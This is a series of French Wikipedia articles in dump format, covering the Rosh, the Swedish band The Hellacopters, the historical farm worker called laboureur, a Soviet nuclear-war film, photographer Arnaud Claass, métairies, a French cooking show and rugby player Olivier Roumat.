C’est au travers de son immense œuvre halakhique, qui demeure jusqu’à aujourd’hui l’une des bases essentielles de la loi juive moderne, que se dévoile la stature du Roch. Rabbi Yossef Karo, l’auteur du "Choulhan Aroukh", le décrit comme étant l’un des trois piliers de la Halakha, avec le Rambam et le Rif. Outre des commentaires sur la Torah, la Mishna et quelques traités du Talmud, le Rosh nous a laissé surtout son œuvre principale, le "Hilkhoth haRosh", un recueil de lois selon l’ordre des traités du Talmud, où le Rosh donne en fait une conclusion quasi exhaustive de toutes les Halakhot ayant cours à son époque. Son œuvre fait de lui l’un des décisionnaires les plus suivis dans l’ensemble du peuple juif.

</doc>
<doc id="568455" url="https://fr.wikipedia.org/wiki?curid=568455" title="The Hellacopters">
The Hellacopters

The Hellacopters est un groupe suédois de hard rock, originaire de Stockholm. Il est formé en 1994 et séparé en 2008, puis reformé en 2016. Le style musical du groupe est désigné sous le terme de , aussi appelé .
Histoire.
Débuts (1994–1999).
La première répétition des Hellacopters a lieu le entre de nouveaux amis. Initialement commencé comme un projet parallèle de Nicke Andersson (ancien batteur d'Entombed) avec Dregen, Kenny Håkansson, et Robert Eriksson, le groupe sort leur premier single - "Killing Alan" - en janvier 1995 sur leur propre label Psychout (enregistré seulement après 3 répétitions).
Après un autre single, intitulé "1995", les Hellacopters signent avec White Jazz Records et sortent leur premier album "Supershitty to the Max!" en . Après une tournée intensive, ils reçoivent un Swedish Grammy pour cet album, puis recrutent brièvement Anders Lindström pour l'ouverture des dates scandinaves de Kiss en juin 1997 après avoir sorti "Payin' the Dues".
Au début de l'année 1998 le groupe tourne en Europe avec Gluecifer, puis Dregen quitte les Hellacopters pour se concentrer sur ses Backyard Babies après la tournée. Avec deux guitaristes remplaçant Chuck Pounder et Mattias Hellberg, les Hellacopters jouent alors 114 concerts dans 18 pays dont les États-Unis, le Canada, l’Australie, la Nouvelle-Zélande, et le Japon. En septembre de cette année, ils enregistrent leur troisième album, "Grande Rock", avec Anders Lindström comme second guitariste. En février 1999, Robert Dahlqvist est recruté comme second guitariste, complétant la formation actuelle. Avec lui, les Hellacopters vont enregistrer leurs trois albums suivants et continuer à tourner encore et encore.
"By the Grace of God" (2000–2004).
Au début de 2002, le groupe publie sa première compilation de morceaux inédits, "Cream of the Crap Vol. 1". Ils enregistrent 20 morceaux de leur cinquième album aux studios Polar de Stockholm ; 13 d'entre eux incluent ceux de "By the Grace of God". Il devient leur premier album à succès, qui atteint la deuxième place en Suède, et la place en Finlande, puis il est de nouveau certifié disque d'or en Suède. Le morceau-titre atteint les charts de singles, et est diffusé à la radio et à la télévision. Le groupe ouvre aussi en concert pour les Rolling Stones et ZZ Top à Stockholm et Helsinki.
"Rock and Roll is Dead" (2005–2006).
Avant la séparation des Hellacopters, leur deuxième compilation de morceaux inédits, "Cream of the Crap Vol. 2", est publiée. Le groupe révèle avoir suffisamment de morceaux pour en faire deux autres volumes, mais il ne prévoit aucune sortie dans la lignée des "Cream of the Crap". Eriksson et Lindstrom font une petite virée en Italie pour enregistrer "Rock and Roll Is Dead" en 2005. Le titre est une référence à leur perception de l'industrie musicale.
L'album entre dans les charts suédois et atteint le top 20 en Finlande. En mars 2006, The Hellacopters tournent pendant trois ans aux États-Unis, et passent pas la Suède avec The Hives, Millencollin, Backyard Babies et The Soundtrack of Our Lives pour le "Where the Action Is Tour". Le morceau "Nothing Terribly New" est mentionné à plusieurs reprises par Steven Van Zandt (E Street Band) comme l'un de ses morceaux garage rock préférés.
"Head Off" et séparation (2007–2008).
Le , The Hellacopters annoncent officiellement leur séparation via leur site web, tout en précisant que leur septième et dernier album "Head Off" serait disponible début 2008. L'album débute quatrième des charts suédois et dans le top 20 finlandais et norvégiens. Il s'ensuit une tournée d'adieu européenne qui se déroule au cours de l'année 2008. Leur dernier concert est joué au Debaser Medis de Stockholm les 25 et ; les concerts sont filmés et diffusés en direct sur Myspace. De nombreux amis et collaborateurs étaient parmi le public comme Sahara Hotnights, Entombed, Burst, Stefan Sundström, Texas Terri, Pernilla Andersson et "Demons". Le groupe sort un double-album, live de leur tournée "Tour Before the Fall".
Retour (depuis 2016).
En 2016, la première biographie du groupe, à laquelle tous les membres participent, est publiée, "The Hellacopters, du kérosène dans les veines", de Rudy Charis, parait aux Éditions du Camion blanc en français, et à paraître en anglais courant 2018. En juin, la formation originale du groupe se produit au Sweden Rock Festival à l'occasion du vingtième anniversaire de la sortie de leur premier album. Le concert est précédé en mai par la sortie d'un single composé de deux inédits composés en 1996 mais enregistrés en 2016. Début , les membres du groupe annonce la mort de leur ancien guitariste Robert Dahlqvist.
Le , le groupe annonce le départ pour raisons personnelles de Kenny et son remplacement par le finlandais Sami Yaffa (entre autres Hanoi Rocks). Le groupe tourne à nouveau durant le printemps et l'été 2017.

</doc>
<doc id="568456" url="https://fr.wikipedia.org/wiki?curid=568456" title="Hellacopters">
Hellacopters



</doc>
<doc id="568457" url="https://fr.wikipedia.org/wiki?curid=568457" title="Laboureur">
Laboureur

Le laboureur est une personne qui travaille le sol. La définition a évolué au cours de l'histoire. Sous l’Ancien Régime et jusqu'au , « laboureur » désignait un statut, celui du paysan qui possédait la terre qu'il cultivait et au moins un attelage, cheval ou paire de bœufs, et charrue. Cependant, en français moderne, un laboureur est une personne qui laboure la terre, sans notion de statut. 
Hiérarchisation du monde paysan.
Le sens du mot variait d'une région à l'autre. En Ile-de-France, le laboureur qualifiait un fermier aisé. En Normandie, le laboureur se situait entre le fermier et le manouvrier.
Au temps de la féodalité, laboureur désigne un paysan aisé disposant de bête(s) de labour (cheval ou paire de bœufs) et d'une vraie charrue. Le laboureur est généralement un paysan censitaire dépendant d'un seigneur. Rarement il peut être alleutier (propriétaire à part entière).
Sous l’Ancien Régime en France, les laboureurs sont des paysans qui se sont enrichis et disposent d'un attelage de labour. Certains, les fermiers et les métayers, ont réussi à échapper partiellement au système de la féodalité, en effet ces catégories de paysans louent leurs terres et ne sont plus dans la dépendance du seigneur à la différence des paysans censiers. Ils sont considérés comme des notables des campagnes, très présents dans les assemblées villageoises et, parfois, interlocuteurs directs du seigneur du lieu. 
Certains sont riches (tel le « coq de village » qui dispose des moyens de culture, notamment du train d'attelage et des bêtes de trait qu'il prête aux autres paysans), d'autres moins, mais ils représentent néanmoins l'élite de la paysannerie avec les fermiers aisés. De leurs terres, ils parviennent à tirer la subsistance de leur famille quelle que soit la conjoncture climatique ou économique. Beaucoup sont des fermiers qui possèdent un ou plusieurs terrains de culture, du bétail, des semences et du fourrage. Ils louent des superficies importantes (réserves seigneuriales) qu'ils pourront mettre en valeur grâce à leur capital d'exploitation. Pendant la crise, cependant, les crédits auprès des seigneurs terriens se multiplieront afin de conserver les terres louées. Si les intérêts n'étaient pas remboursés à temps, alors ils étaient expulsés. Au , certains laboureurs, notamment en Beauce, exploiteront parfois plus de cent hectares dont ils possèdent eux-mêmes une partie. 
La catégorie de paysans moins favorisée est celle des « ménagers », ne possédant que de (très) petites parcelles de terre et bien sûr pas de cheval, seulement un âne, un mulet voire une vache. En Provence et Languedoc cependant le Ménager sous l’Ancien Régime est un exploitant aisé possédant de grandes parcelles et des chevaux.
Cette distinction est donc à nuancer selon les époques et les régions.
Les plus pauvres, parmi la population rurale active, sont ceux qui louent, au jour le jour, leurs services, leurs forces et ne disposent que de leurs bras, leurs mains. On les désigne donc comme des « journaliers », des « brassiers », des « manouvriers »
À partir du , la dénomination cultivateur remplace progressivement le mot « laboureur » et est souvent rencontré en généalogie.

</doc>
<doc id="568458" url="https://fr.wikipedia.org/wiki?curid=568458" title="Bordager">
Bordager



</doc>
<doc id="568459" url="https://fr.wikipedia.org/wiki?curid=568459" title="Lettres d'un homme mort">
Lettres d'un homme mort

Lettres d'un homme mort (en , "Pisma myortvogo cheloveka") est un film soviétique réalisé par Konstantin Lopouchanski, sorti en 1986. Ce film évoquant les angoisses d'un peuple face au risque nucléaire, est sorti un mois avant la catastrophe nucléaire de Tchernobyl.
Synopsis.
Un homme qui s'avère par la suite être le professeur Larssen, écrit à son fils, dont il espère qu'il vit toujours. 
L'histoire se déroule dans une cité indéterminée, peu après un accident nucléaire d'une ampleur mondiale survenu lors d'un conflit militaire.
Le professeur Larssen, lauréat du prix Nobel, avec un petit groupe de survivants s'abrite dans le bunker protégé au sous-sol du musée où jadis travaillait sa femme, qui n'a pas eu le temps d'y descendre suffisamment vite et souffre de séquelles d'irradiation. Les Larssen sont sans nouvelles de leur fils Eric. 
Leurs compagnons d'infortune occupent leur esprit à dresser le bilan du passage de l'humanité dans l'univers ou à spéculer sur l'intérêt à laisser un message aux représentants des autres civilisations. Malgré l'abattement, tous s'efforcent à conserver une politesse dans leurs rapports et encouragent les uns les autres. Entre-temps, une visite de médecin en chef a lieu, pour déterminer qui va regagner le bunker central pourvu du dispositif de survie. Dans le groupe, se trouve une douzaine d'enfants, orphelins interdits de transfert, car seuls les enfants accompagnés de parents et en bonne santé sont susceptibles d'être secourus. 
L'ami de Larssen qui travaille dans l'infirmerie, le fournit en anti-douleurs dont sa femme ne peut se passer. Le professeur fait également un saut au marché noir dans l'espoir de trouver quelque chose pour la soulager, mais elle finit par mourir et sera enterrée dans la galerie à quelques pas de la pièce à vivre. 
Eric reste introuvable malgré les recherches frénétiques de son père qui sur son parcours brave les interdits de la loi martiale. Mais leur correspondance continue et prend forme d'une méditation sur les questions existentielles.
Vient le moment du départ pour le bunker central. Larssen refuse de quitter les enfants condamnés. Quand tout le monde est parti, il remonte avec eux à la surface.

</doc>
<doc id="568461" url="https://fr.wikipedia.org/wiki?curid=568461" title="Rosh">
Rosh

ראש (translittéré en français « roch » ou « rosh ») est un mot hébreu qui signifie « tête ».
Il peut désigner aussi :

</doc>
<doc id="568462" url="https://fr.wikipedia.org/wiki?curid=568462" title="Arnaud Claass">
Arnaud Claass

Arnaud Claass (né le à Paris) est un photographe et théoricien de la photographie français.
Biographie.
Après des études musicales, Arnaud Claass décide en 1968 de se consacrer à la photographie. Il travaille principalement aux États-Unis jusqu’au milieu des années 1970, vivant du reportage, qu'il oriente progressivement vers une œuvre plus personnelle. Partant d'une photographie de l'errance, inspirée de Robert Frank, Walker Evans, Harry Callahan et d'autres maîtres de la modernité européenne comme Henri Cartier-Bresson, il développe la notion de série photographique, qui aboutit à l'ensemble "Contretemps", qu'il expose au musée national d'art moderne (Centre Georges-Pompidou) en 1979, à l'invitation de Pierre de Fenoÿl et Alain Sayag.
Il opère ensuite un retour à l'idée de paysage en photographie. Puis son travail prend un tour plus intimiste : il développe au long des années 1980 une pratique de la disponibilité visuelle la plus attentive aux aléas de son environnement immédiat, chez lui ou en voyage (séries "Continuités", "Silences", "Enfances"). La série "Précaire" (1992-1996) envisage la fragilité des choses et des objets. 
L'ensemble suivant, "Patience" (1997-1998) redonne la part belle à l'environnement new-yorkais, dont les aspects sont saisis comme une sorte d'espace mental. 
Il passe à la couleur à la fin des années 1990, toujours concentré sur les jeux de la perception photographique la plus directe : séries "Mémoire vive", "Nuit optimale", "Heure locale", qui sont, outre des expositions, autant de livres dans lesquels ses images s'entrecroisent avec son écriture. 
Depuis 2009, il compose des collages où ses propres photographies voisinent avec des images ou des fragments de textes issus de journaux, d'encyclopédies et autres matériaux imprimés. 
Ses œuvres sont présentes dans de nombreuses collections publiques et privées, parmi lesquelles le Musée national d'Art moderne, la Maison européenne de la photographie, le Fonds national d'art contemporain, le FRAC Lorraine, le National Museum of Modern Art (Tokyo), le musée des Beaux-Arts de Houston, l'Art Institute of Chicago, le Center for Creative Photography (université d'Arizona). 
En 1975, il participe à la création de Contrejour. Puis, dès 1979, Arnaud Claass s'est mis à publier des textes théoriques, où il développe entre autres une critique des catégories barthésiennes de l'analyse photographique, invitant à voir dans le travail du photographe ce que Michel Frizot appelle « une pratique d’apprivoisement des choses ». Il participe à l'aventure des "Cahiers de la photographie" créés par Gilles Mora, Denis Roche, Claude Nori, Jacques Clayssen... Depuis, il n'a cessé d'explorer la singularité du médium (terme qui est selon lui à redéfinir et non à refouler) et son histoire partiellement autonome. S'il refuse l'idée d'une « essence » de la photographie, il s'oppose aussi à sa dilution pure et simple dans les arts plastiques, bien qu'il s'intéresse à nombre d'artistes généralistes qui l'utilisent par intermittence. Il s'attaque surtout à l'illusion intellectualiste, assez répandue chez des « photographes plasticiens », selon laquelle la photographie pourrait être réduite à un simple « outil », rappelant qu'elle commande en grande partie les conduites et constructions de sens de celui ou celle qui croient la maîtriser. Il cite d'ailleurs souvent la fameuse remarque du photographe Charles Harbutt : « I don't take pictures, pictures take me ». 
Il devient professeur coordonnateur à l’École nationale supérieure de la photographie dès sa création en 1983. Outre son propre enseignement, il invite un grand nombre de personnalités, en un éventail s'ouvrant de l'esthétique la plus « froide » au reportage de guerre, du regard le plus contemplatif aux pratiques les plus existentielles, par exemple : Lewis Baltz, Lynne Cohen, Stanley Greene, Jane Evelyn Atwood, Victor Burgin, Luc Delahaye, Marc Trivier, Claire Chevrier, Jean-Christian Bourcart, Beat Streuli, et comme critiques ou théoriciens Bernard Lamarche-Vadel, Régis Durand. Il occupe ce poste à l'ENSP/Arles jusqu'en 2014. 
Si Arnaud Claass est perplexe devant certaines formes d'idolâtrie pour les nouvelles technologies, devant le déni du réel et le caractère souvent aseptisé des résultats obtenus, il ne les rejette nullement en bloc. C'est même parfois à leur lumière qu'il renouvelle ses analyses consacrées à la photographie directe. Il postule en effet que les techniques de pointe, vues à travers leurs meilleures productions, non seulement n'affaiblissent pas la photographie, mais en avivent la nécessité, comme le montre l'intérêt jamais démenti qu'elle suscite auprès des jeunes générations. Il traduit des auteurs ou artistes-théoriciens spécialistes des nouveaux médias encore mal connus en France qui lui paraissent détonner par rapport aux naïvetés du fétichisme technologique, tels Fred Ritchin, Geoffrey Batchen, Hiroshi Ishii, Lev Manovich...
Depuis de nombreuses années, il est invité régulièrement en tant qu’artiste, critique et enseignant à l'International Center of Photography de New York, à l’École des arts appliqués de Vevey en Suisse, au Hooge Institut Voor Schone Kunst d'Anvers, à l'Institute of Arts, Design and Technology de Dublin, à la Fondazione Marangoni de Florence, à la Haute Ecole d'Art et de Design (Genève)...
Expositions.
Expositions personnelles (sélection) :

</doc>
<doc id="568464" url="https://fr.wikipedia.org/wiki?curid=568464" title="Métairie (colonat partiaire)">
Métairie (colonat partiaire)

Une métairie est un ensemble de bâtiments et de terres voués à l'agriculture et occupé par un "métayer" et sa famille.
Métayage.
C'est l'association d'un propriétaire qui apporte le capital et d'un métayer qui propose son travail. Le bailleur souvent intervient directement dans la gestion de l'exploitation (le choix des productions), mais c'est le métayer qui gère au quotidien. Le terme de « métayage » vient étymologiquement de « moitié » signifiant un partage par moitié des produits, mais cela peut être différent selon les traditions du lieu et de l'époque, et la négociation lors de la conclusion du contrat.
En France.
Description.
En France, le métayage est traité dans l'article L462-1 du Code rural : . L'article L.417-3 limite la part du bailleur au maximum au tiers des produits.
Historique des métairies dans l'ouest de la France.
Dans l'ouest de la France, il existe deux sortes d'exploitations agricoles : les grandes sont les métairies (elles font de 20 à selon les régions), les petites qui font moins de et souvent moins de s'appellent soit des closeries, soit des borderies.
La métairie est donc exploitée par le cultivateur, laboureur, le bordage est exploité par le bordager. Ils sont tous les deux locataires. Le laboureur a souvent un niveau de vie plus aisé que le bordager. D'ailleurs certains laboureurs sont parfois propriétaires d'un bordage.
Le métayer payait en nature ou en argent un pourcentage de ses récoltes, définit selon le métayage, le contrat de bail signé, ou la parole donnée (souvent 50 % dans l'ouest de la France). Un fermier payait une somme fixe, le fermage, car il payait à ferme. Une bonne année pouvait lui être bénéfique, une mauvaise pouvait l’entraîner dans de graves difficultés : il fallait payer la somme prévue.
Dans l'ensemble, les fermiers étaient plus à l'aise que les métayers. Les métayers voyaient aussi beaucoup plus souvent leurs propriétaires ou leurs « "régisseurs" » qui contrôlaient les fraudes ou dissimulations.
Au Québec.
Une partie de l'exploitation agricole de la Nouvelle-France (Québec) procédait sous forme de la métairie, en particulier sur l'île des Sœurs (anciennement île Saint-Paul), aujourd'hui à Montréal. Le toponyme du parc de la Métairie le commémore.

</doc>
<doc id="568469" url="https://fr.wikipedia.org/wiki?curid=568469" title="Métairie (ferme-restaurant)">
Métairie (ferme-restaurant)

Le terme de métairie désigne les fermes-restaurants qui jalonnent les crêtes du Jura suisse, en particulier dans la région du Jura bernois, mais aussi dans les montagnes neuchâteloises et dans le canton du Jura.
Une métairie est une ferme de montagne isolée qui offre un service de restauration. En règle générale, le restaurant d'une métairie est exploité par la famille paysanne parallèlement au domaine agricole, mais ne constitue pas son activité principale.
À l'origine les métairies ont été construites sur les montagnes par les bourgeoisies de certaines communes environnantes afin d'y amener les bêtes pour l'été. Une ou plusieurs personnes y passaient la belle saison pour s'occuper du bétail. En France au , les métayers avaient l'obligation de délivrer la moitié du revenu du domaine qu'ils exploitaient au propriétaire. Il est possible que le mot métayer ait engendré le terme métairie dans le Jura suisse, terme plus particulièrement utilisé dans la région du Chasseral. Les communes propriétaires des domaines ont souvent donné leur nom, comme la Métairie du Milieu de Bienne, la Métairie de Nidau, de Prêles ou encore d'Aarberg.
Aujourd'hui, il existe encore de nombreuses métairies qui sont exploitées activement. Certaines d'entre elles produisent du fromage à partir du lait des vaches qui s'y trouvent pendant la belle saison. En particulier, le gruyère d'alpage fait le bonheur des amateurs de saveurs authentiques. Par ailleurs, on y produit aussi de l'eau-de-vie de gentiane jaune, plante typique des crêtes jurassiennes.
Les hôtes des métairies y sont accueillis dans un cadre campagnard simple. Les menus proposés vont du plat bernois aux röstis, sorte de grande galette de pommes de terre et à la fondue. Les goûts du terroir ont gardé une grande authenticité dans ces établissements. Il existe plusieurs guides regroupant les métairies, ils sont notamment disponibles auprès des offices du tourisme de la région.

</doc>
<doc id="568472" url="https://fr.wikipedia.org/wiki?curid=568472" title="La Cuisine des mousquetaires">
La Cuisine des mousquetaires

La Cuisine des mousquetaires est une émission culinaire française co-présentée par Maïté et Micheline Banzet. 
Création.
Patrice Bellot, venu réaliser un documentaire sur l'équipe de rugby de Rion-des-Landes, a remarqué Maïté qui leur préparait leurs repas et lui a proposé d'animer l'émission. Le projet d'émission existait déjà, et devait s'articuler autour de l'univers d'Alexandre Dumas, du terroir gascon des "Trois Mousquetaires" et de son ouvrage "Le Grand Dictionnaire de cuisine".
Diffusion.
La première version de l'émission a d'abord été diffusée à partir du 22 octobre 1983 sur FR3 Aquitaine à l'initiative du directeur des programmes Jean-Claude Sire, puis à partir du jusqu'au , sur le réseau national de FR3 puis France 3. Elle connaitra également une diffusion sur la chaine francophone internationale TV5 Europe.
Le 7 janvier 2023, l'émission revient dans une nouvelle formule sur France 3 Occitanie, présentée par Caroline Estremo et Fabrice Mignot.
La première version de l'émission continue de rencontrer un succès considérable sur la chaine YouTube de l'INA qui rediffuse les émissions présentées par Maïté et Micheline Banzet.
Indicatif du générique.
L'indicatif musical du générique de l'émission est tiré du moderato de la sonate a quattro en sol majeur de Gioachino Rossini.

</doc>
<doc id="568476" url="https://fr.wikipedia.org/wiki?curid=568476" title="Olivier Roumat">
Olivier Roumat

Olivier Roumat, né le à Mont-de-Marsan (Landes), est un joueur international français de rugby à XV, jouant principalement au poste de deuxième ligne.
Il commence sa carrière en 1985 à l'US Dax, où il joue durant dix ans jusqu'à son départ pour l'Afrique du Sud en 1995. Il rejoint alors les Natal Sharks avec qui il remporte la Currie Cup. L'année suivante, il fait son retour en France et à Dax avant de s'engager avec le Stade français en 1997. Il ne joue qu'une saison à Paris durant laquelle il remporte le Championnat de France. Après ce titre, en 1998, il part au Biarritz olympique où il gagne la Coupe de France en 2000 et le Championnat de France en 2002. Il termine sa carrière avec le club basque en 2003.
En parallèle de sa carrière en Club, Olivier Roumat joue avec le "XV de France" durant sept ans, de 1989 à 1996. Avec les "Bleus", il remporte le Tournoi des Cinq Nations en 1993 et termine troisième de la Coupe du monde en 1995.
Son fils Alexandre est aussi joueur professionnel de rugby à XV et international français. Il joue au Biarritz olympique de 2015 à 2017, à l'Union Bordeaux Bègles de 2017 à 2022, puis au Stade toulousain.
Biographie.
Jeunesse et formation.
Olivier Roumat nait le à Mont-de-Marsan dans les Landes de parents enseignants. Il joue au rugby à XV avec le club de la Jeunesse sportive de Villeneuve-de-Marsan durant toute sa jeunesse jusqu'à son départ à Dax en 1985.
En parallèle du rugby, il étudie pour devenir géomètre-expert et obtient son diplôme en 1994.
Débuts à Dax puis en équipe de France (1985-1995).
Olivier Roumat commence sa carrière avec l'US Dax qu'il rejoint en 1985, intégrant l'équipe première lors de la saison 1986-1987. 
En 1988, les Dacquois sont en finale du Challenge Yves du Manoir. Dans une rencontre face au Stade toulousain, Roumat est titulaire en troisième ligne aile et les Landais sont battus de deux points 15 à 13. 
Après de bonnes performances avec son club, il est sélectionné en équipe de France et obtient sa première cape avec les "Bleus" le , lors du second match de la tournée estivale, contre la Nouvelle-Zélande. Face aux "All Blacks", Olivier Roumat commence la rencontre sur le banc des remplaçants avant d'entrer en cours de partie. Le "XV de France" est alors battu 34 à 20. Plus tard dans l'année, il connaît sa deuxième sélection à l'occasion d'un match amical contre les Lions britanniques. Titularisé pour la première fois en équipe nationale, il joue cette rencontre au poste de troisième ligne centre. Toutefois, malgré un score serré, les Français sont battus 27-29. Il s'agit de leur première défaite au Parc des Princes depuis 1982.
En début d'année 1990, il est appelé avec la France pour participer à son premier Tournoi des Cinq Nations. Les "Bleus" terminent à la troisième place. Il participe également à cette compétition l'année suivante, en 1991.
Après s'être fait une place dans la sélection française, que ce soit au poste de deuxième ligne ou de troisième ligne, Olivier Roumat est ensuite appelé par Daniel Dubroca pour sa première Coupe du monde, en 1991. Lors du premier match de la compétition face à la Roumanie, Roumat marque un essai dans une victoire 30-3. Il joue ensuite les deux autres matchs de la phase de poule, remportés contre les Fidji, puis le Canada. Avec trois victoires en trois matchs, les Français se qualifient pour les quarts de finale du Mondial, mais sont éliminés à ce stade de la compétition par l'Angleterre, après une défaite 19 à 10.
Quelques mois après cette Coupe du monde, en , Olivier Roumat est sélectionné dans un XV mondial qui doit affronter les "All Blacks" à l’occasion du centenaire de la fédération néo-zélandaise de rugby à XV. Avant cette rencontre, il gagne un premier match durant lequel il est titulaire en deuxième ligne aux côtés du champion du monde, l’Australien John Eales. Lors du deuxième match, il est exclu au bout de seulement neuf minutes de jeu, après un coup de pied sur Sean Fitzpatrick, le capitaine des "All Blacks". Il écope alors de quatre semaines de suspension. Ce moment est selon lui « le pire moment de sa carrière » et lui a permis de travailler sur la maîtrise de soi. Cette suspension lui fait ainsi manquer les phases finales du championnat de France avec l'US Dax, et son sélectionneur Pierre Berbizier, le sanctionne en ne le convoquant pas pour la tournée en Argentine. Olivier Roumat fait son retour avec l'équipe de France pour la tournée d'automne, qui voit les Français battre les "Springboks".
En 1993, il est rappelé avec le "XV de France" pour le Tournoi des Cinq Nations et devient le capitaine de la sélection. Avec trois victoires en quatre matchs, la France remporte le tournoi pour la première fois depuis quatre ans.
Au mois de , il est sélectionné en équipe de France par Pierre Berbizier dans un groupe de 26 joueurs pour la Coupe du monde se déroulant en Afrique du Sud. Durant ce Mondial, les Français terminent premier de leur poule, puis sont éliminés en demi-finale de la compétition par les "Springboks" qui remportent ensuite le trophée. Pour la troisième place, le "XV de France" affronte l'Angleterre et s'impose 19 à 9, terminant ainsi sur le podium.
Passage en Afrique du Sud puis retour à Dax et retraite internationale (1995-1997).
Après le Mondial, Olivier Roumat quitte la France pour l'Afrique du Sud et rejoint les Natal Sharks, en compagnie de son compatriote Thierry Lacroix. Ils sont alors accusés de venir ici pour « prendre de l'argent et passer des vacances ». Cependant, les deux français s'intègrent rapidement dans leur nouvelle équipe, entraînée par le zimbabwéen Ian McIntosh. Ils participent à la Currie Cup 1995. Cette année, les Natal Sharks atteignent la finale de la compétition. Pour cette rencontre ils affrontent la Western Province et Olivier Roumat est titularisé en deuxième ligne, aux côtés du récent champion du monde, Mark Andrews. Grâce notamment à six pénalités de Lacroix, les Natal Sharks remportent la finale sur le score de 25 à 17. Les deux français deviennent ainsi les premiers Français à remporter ce trophée. Ils remportent par la même occasion le premier titre de leur carrière, après n'avoir rien gagné en dix ans à Dax.
À la suite de ce départ en Afrique du Sud, la Fédération française de rugby dirigée par Bernard Lapasset décide de suspendre Olivier Roumat de l'équipe de France pour les mois d'octobre et novembre 1995. Ainsi, ne pouvant pas jouer pour les "Bleus", il est, le , invité pour la première fois avec les Barbarians français pour jouer contre la Nouvelle-Zélande à Toulon. Les "Baa-Baas" s'inclinent 19 à 34.
Olivier Roumat fait ensuite son retour à Dax, en 1996. Puis, il fait son retour en équipe de France lorsqu'il est sélectionné pour le Tournoi des Cinq Nations de la même année. Pour le premier match du tournoi, contre l'Angleterre, il est titularisé en compagnie de trois autres Dacquois : Thierry Lacroix, Richard Dourthe et Fabien Pelous, ce qui est un record. En effet, c'est la première fois qu'autant de joueurs de l'US Dax sont titularisés pour un même match. Seulement trois joueurs du club avaient déjà été alignés en même temps pour un match de la France : Jean-Pierre Lux, Claude Dourthe et Jean-Pierre Bastiat, dans les années 1970. Son retour avec la sélection permet de décaler Pelous au poste de troisième ligne centre afin renforcer ce poste, ce qui avait manqué durant son absence. Avec seulement deux victoires, la France termine à la troisième place de ce tournoi. Pendant cette période, Olivier Roumat est sollicité par des clubs anglais et aussi pour un retour en Afrique du Sud chez les Natal Sharks. Il ne répondra toutefois pas favorablement à ces propositions. Peu après ce tournoi, il est convoqué avec les Bleus pour la tournée d'été en Argentine, où les Français jouent deux rencontres face aux "Pumas". Ces matchs face aux Argentins sont ses derniers en équipe de France puisqu'il n'est ensuite plus apparu avec le maillot bleu. Il arrête ainsi sa carrière internationale avec 61 capes pour 5 essais marqués.
Avant le début la saison 1996-1997, Olivier Roumat se blesse au dos. Il manque alors un match avec les Barbarians britanniques, où il aurait dû devenir le premier Français à être nommé capitaine de cette sélection. Il rate également le début de saison avec son club. Il est alors opéré au mois de d'une excroissance à un disque vertébral. Il fait son retour sur les terrains un mois plus tard, en , lors d'un match avec l'équipe espoirs dacquoise.
Transfert au Stade français puis fin de carrière à Biarritz (1997-2003).
Douze ans après l'avoir rejoint, Olivier Roumat quitte l'US Dax pour le Stade français qu'il rejoint pour la saison 1997-1998. Dans un premier temps, le , il est invité avec les Barbarians français pour jouer contre le Lansdowne RFC à Dublin. Les "Baa-Baas" s'imposent 31 à 24. Puis, le , il rejoue avec les "Baa-Baas" contre l'Afrique du Sud à Biarritz, qui s'imposent 40 à 22. Dans un second temps, durant la suite de la saison, le Stade français se qualifie en phases finales du championnat de France. Après avoir éliminé le CA Bordeaux Bègles en quart de finale, les Parisiens font face au Stade toulousain en demi-finale. Grâce à une nouvelle victoire 39 à 3, le Stade français arrive en finale où il doit battre l'USA Perpignan pour remporter le titre. Olivier Roumat commence la finale sur le banc des remplaçants puis entre à la place de David Auradou. Pour la première finale disputée au Stade de France, son équipe s'impose 34 à 7 et remporte ainsi son neuvième bouclier de Brennus. De plus, le club est également finaliste de la Coupe de France. Titulaire en deuxième ligne avec le Néo-zélandais Grant Ross, Olivier Roumat perd cette deuxième finale de la saison, après une défaite 22-15 contre le Stade toulousain.
À l'issue de sa première saison au Stade français, Olivier Roumat s'engage avec le Biarritz olympique, entraîné par Patrice Lagisquet. Il va par la suite aider le club basque à devenir l'un des meilleurs clubs français. En effet, il remporte d'abord la Coupe de France en 2000, en battant le CA Brive 24-13. Pour cette rencontre il est titularisé en deuxième ligne aux côtés de Legi Matiu. Puis, au cours de la saison 2001-2002, Roumat est d'abord, sélectionné en avec les Barbarians français pour un match contre les Fidji à Toulon, durant lequel il est capitaine de l'équipe et les "Baa-Baas" s'inclinent 17 à 15. Durant la suite de la saison, le Biarritz olympique atteint la finale de la Coupe de la Ligue qu'il perd 23-19 contre le Stade rochelais. Puis les Biarrots jouent les phases finales du championnat. Dans un premier temps, ils éliminent le Stade toulousain en demi-finale. Puis, ils font face au SU Agen en finale. Roumat est titularisé au poste de deuxième ligne avec Jean-Philippe Versailles et le match se termine sur le score de 19 à 19 à la fin du temps règlementaire. Finalement, grâce à un drop de Laurent Mazas en toute fin des prolongations, le BO l'emporte 25-22 et est champion de France pour la première fois depuis 1939. Olivier Roumat remporte quant à lui le deuxième bouclier de Brennus de sa carrière.
En septembre 2003, il joue avec les Barbarians français à l'occasion d'un match opposant le XV de France, rebaptisé pour l'occasion "XV du Président" (afin de contourner le règlement qui interdit tout match international à moins d'un mois de la Coupe du monde), et les Barbarians français, composés essentiellement des joueurs tricolores non retenus dans ce XV présidentiel et mis à disposition des "Baa-Baas" par Bernard Laporte. Ce match se déroule au Parc des sports et de l'amitié à Narbonne et voit le "XV du président" s'imposer 83 à 12 face aux "Baa-Baas".
À la fin de la saison 2002-2003, il décide de prendre sa retraite sportive après 20 ans de carrière.
Après carrière.
Après sa carrière de joueur, Olivier Roumat devient consultant sur Canal+ Sport et Rugby+ en 2003. Il commente des matchs et participe aux émissions "Les Spécialistes rugby" et "Late Rugby Club". Après avoir acheté deux campings à Seignosse et Saint-Jean-de-Luz, il devient promoteur immobilier et est à la tête du restaurant "Dégustations du Lac" et de l'hôtel "le Mercedes" à Soorts-Hossegor.
En début de saison 2010-2011, il devient manager de l'US Dax, où il remplace Thomas Lièvremont, Christophe Milhères et Laurent Mazas. Il est accompagné par Jean-Philippe Coyola, qui entraîne les trois-quarts, et Olivier Magne, en charge les avants. Après onze défaites en quatorze rencontres, il démissionne au mois de , laissant son club avant dernier du championnat.
Statistiques en équipe nationale.
